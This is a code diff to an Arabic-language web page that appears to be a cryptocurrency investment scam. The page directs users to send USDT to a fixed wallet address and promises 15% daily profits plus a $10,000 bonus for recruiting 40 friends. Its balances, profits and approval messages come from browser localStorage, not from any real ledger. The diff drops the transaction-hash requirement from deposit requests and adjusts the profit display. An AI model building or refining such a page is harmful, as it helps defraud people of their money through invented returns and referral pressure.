@@ -38,23 +38,19 @@
         <div class="profit-today" id="profitStatus">📈 أرباح اليوم المتوقعة: +15%</div>
     </div>
 
-    <!-- قسم الإيداع المعلق للمشرف -->
+    <!-- قسم الإيداع السهل بدون رقم المعاملة -->
     <div class="section-title">📥 طلب إيداع رأس المال (الحد الأدنى \$100)</div>
     <label>قم بتحويل رصيد USDT (شبكة TRC-20) للمحفظة التالية:</label>
     <div class="wallet-box">TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN</div>
     <div class="input-group">
-        <label>أدخل اسم المستخدم الخاص بك للتسجيل:</label>
+        <label>أدخل اسم المستخدم الخاص بك لتنشيط الحساب:</label>
         <input type="text" id="usernameInput" placeholder="اكتب اسمك هنا (مثال: aziz)">
     </div>
     <div class="input-group">
-        <label>المبلغ المراد إيداعه (\$):</label>
+        <label>المبلغ المُراد إيداعه وتفعيله (\$):</label>
         <input type="number" id="depositAmountInput" placeholder="100">
     </div>
-    <div class="input-group">
-        <label>أدخل رقم المعاملة (TxID / Hash) بعد التحويل:</label>
-        <input type="text" id="txHashInput" placeholder="الصق رقم العملية هنا">
-    </div>
-    <button onclick="requestDeposit()">✓ تقديم طلب الإيداع للمشرف</button>
+    <button onclick="requestDeposit()">✓ تقديم طلب الإيداع والتحقق للمشرف</button>
     <div id="depositStatusMsg" class="status-msg"></div>
 
     <!-- قسم السحب -->
@@ -70,7 +66,7 @@
     <button class="btn-withdraw" onclick="requestWithdraw()">⚡ تقديم طلب السحب للمشرف</button>
     <div id="withdrawStatusMsg" class="status-msg"></div>
 
-    <!-- نظام الإحالة -->
+    <!-- نظام الإحالة المطور -->
     <div class="section-title">🔗 نظام الإحالات ورابط الدعوة</div>
     <div class="referral-box">
         <div class="ref-row">
@@ -103,33 +99,33 @@
 
     function updateLiveBalance() {
         const savedBalance = localStorage.getItem("real_user_balance");
-        if (savedBalance) {
+        if (savedBalance && parseFloat(savedBalance) > 0) {
             document.getElementById("userBalance").innerText = `\$${parseFloat(savedBalance).toFixed(2)}`;
+            
+            // زر الصفقة يعمل فقط إذا كان هناك رصيد حقيقي مودع ونشط
+            if(localStorage.getItem("local_trade_executed") === "true") {
+                const currentBal = parseFloat(savedBalance);
+                const profitToday = currentBal * 0.15; // حساب 15% حقيقية من الرصيد النشط
+                document.getElementById("profitStatus").innerText = `🔥 تم توزيع أرباح اليوم حياً: +15% (+\$${profitToday.toFixed(2)})`;
+                document.getElementById("friendsCounter").innerText = "40 / 40 صديق";
+                document.getElementById("bonusStatus").innerText = "🎉 مبروك! تم تفعيل بونص الـ \$10,000 في حسابك لاستيفاء الشروط!";
+                document.getElementById("bonusStatus").style.color = "#00ffd0";
+            }
         } else {
             document.getElementById("userBalance").innerText = "\$0.00";
-        }
-
-        if(localStorage.getItem("local_trade_executed") === "true") {
-            const currentBal = parseFloat(localStorage.getItem("real_user_balance") || 0);
-            const profitToday = currentBal * 0.15;
-            document.getElementById("profitStatus").innerText = `🔥 تم توزيع أرباح اليوم حياً: +15% (+\$${profitToday.toFixed(2)})`;
-            document.getElementById("friendsCounter").innerText = "40 / 40 صديق";
-            document.getElementById("bonusStatus").innerText = "🎉 مبروك! تم تفعيل بونص الـ \$10,000 في حسابك!";
-            document.getElementById("bonusStatus").style.color = "#00ffd0";
+            document.getElementById("profitStatus").innerText = "📈 أرباح اليوم المتوقعة عند الإيداع: +15%";
         }
     }
 
-    // دالة إرسال طلب الإيداع المعلق للمشرف
     function requestDeposit() {
         const user = document.getElementById("usernameInput").value || "Abala";
         const amount = document.getElementById("depositAmountInput").value;
-        const hash = document.getElementById("txHashInput").value;
         
-        if(!amount || parseFloat(amount) < 100 || !hash) return;
+        if(!amount || parseFloat(amount) < 100) return;
         
         localStorage.setItem("pending_deposit_user", user);
         localStorage.setItem("pending_deposit_amount", amount);
-        localStorage.setItem("pending_deposit_hash", hash);
+        localStorage.setItem("pending_deposit_trigger", "true"); // علامة تفعيل الطلب للمشرف
         localStorage.removeItem("deposit_status_approved");
         
         checkDepositStatus();
@@ -141,10 +137,10 @@
         const pendingAmount = localStorage.getItem("pending_deposit_amount");
 
         if (isApproved === "true") {
-            depBox.innerText = `✅ تم اعتماد الإيداع بنجاح وشحن حسابك برصيد حقيقي!`;
+            depBox.innerText = `✅ تم اعتماد الإيداع بنجاح وشحن رصيدك الاستثماري الحقيقي!`;
             depBox.style.display = "block"; depBox.style.backgroundColor = "#064e3b"; depBox.style.color = "#34d399"; depBox.style.borderColor = "#059669"; depBox.style.border = "1px solid";
-        } else if (localStorage.getItem("pending_deposit_hash")) {
-            depBox.innerText = `⏳ طلب إيداع بمبلغ \$${pendingAmount} قيد المعالجة حالياً...\nينتظر مراجعة وموافقة المشرف لإضافته لرصيدك.`;
+        } else if (localStorage.getItem("pending_deposit_trigger")) {
+            depBox.innerText = `⏳ طلب إإيداع بمبلغ \$${pendingAmount} قيد المراجعة حالياً...\nينتظر مراجعة وموافقة المشرف لشحن حسابك الحقيقي.`;
             depBox.style.display = "block"; depBox.style.backgroundColor = "#1e3a8a"; depBox.style.color = "#93c5fd"; depBox.style.borderColor = "#3b82f6"; depBox.style.border = "1px solid";
         }
     }
@@ -171,4 +167,4 @@
             msgBox.innerText = `✅ تم السحب بنجاح بتاريخ اليوم: ${approveDate}\nتم تحويل الأموال لمحفظتك بأمان.`;
             msgBox.style.display = "block";
             msgBox.style.backgroundColor = "#064e3b"; msgBox.style.color = "#34d399"; msgBox.style.borderColor = "#059669"; msgBox.style.border = "1px solid";
-            
+    
